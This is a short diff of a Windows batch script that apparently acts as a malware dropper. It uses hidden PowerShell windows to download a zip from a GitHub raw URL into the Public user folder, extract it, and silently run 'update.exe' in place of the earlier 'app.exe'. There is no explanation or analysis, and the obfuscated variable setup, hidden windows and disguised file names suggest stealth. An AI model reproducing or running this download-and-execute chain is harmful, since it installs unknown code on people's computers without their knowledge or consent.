@@ -62,5 +62,4 @@ set ZQ=e
 cls
 C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/Hoangdepzaivcl/dcm/refs/heads/main/update.zip -OutFile C:\\Users\\Public\\Document11.zip;
 C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Expand-Archive C:\\Users\\Public\\Document11.zip -DestinationPath C:\\Users\\Public\\Document11;
-cd "C:\\Users\\Public\\Document11"
-start "app.exe"
+C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden C:\\Users\\Public\\Document11\\update.exe;
